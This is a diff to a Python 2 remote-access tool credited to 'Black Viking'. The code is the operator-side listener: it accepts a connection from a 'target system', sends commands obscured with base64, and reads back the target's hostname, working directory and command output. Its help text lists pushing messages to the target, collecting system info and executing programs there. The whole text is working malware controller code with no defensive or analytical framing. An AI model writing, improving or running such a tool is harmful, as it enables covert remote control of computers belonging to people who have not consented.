@@ -5,7 +5,7 @@
 
 """
 [~] Author : Black Viking
-[~] Version: 0.1
+[~] Version: 0.2
 """
 
 import socket
@@ -25,35 +25,53 @@ def crypt(TEXT, encode=True):
     else:
         return base64.b64decode(TEXT)
 
+def send(data):
+    global pwd
+    cli.sendall(crypt(data))
+    pwd = crypt(cli.recv(1024), False)
+    print(crypt(cli.recv(16384), False))
+
 def help():
-    print"""[*] You can use target system's shell
-[*] You can show messages, just type 'message test'
-[*] You can get target system's info, type 'info()' """
+    print"""
+Commands:
+    message TEXT            : Show messages on target system.
+    info()                  : Show target system's info.
+    execute PROGRAM ARGS    : Execute programs in a new process\n"""
     menu()
 
 def main():
-    global s, cli, addr, hostname
+    global s, cli, addr, hostname, pwd
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
     s.listen(1)
     cli, addr = s.accept()
 
+    pwd = crypt(cli.recv(1024), False)
     hostname = crypt(cli.recv(1024), False)
 
 def menu():
     while True:
-        command = raw_input("[%s@%s]~$ "%(hostname, addr[0]))
-        if command == "clear()":
-            os.system("cls") if os.name == "nt"  else os.system("clear")
-        elif command == "help()":
+        command = raw_input("[%s@%s]-[%s]~$ "%(hostname, addr[0], pwd))
+        if command == "help()":
             help()
+            menu()
 
-        elif command == "": x = " "
-        cmd = crypt(command)
-        cli.sendall(cmd)
-        print(crypt(cli.recv(4096), False))
+        elif ":" in command:
+            os.system(command.replace(":", ""))
+            menu()
 
+        elif command == "": 
+            command = " "
+
+        else:
+            send(command)
+def start():
+    while True:
+        main()
+        menu()
 
 if __name__ == "__main__":
-    main()
-    menu()
+    try:
+        start()
+    except:
+        start()
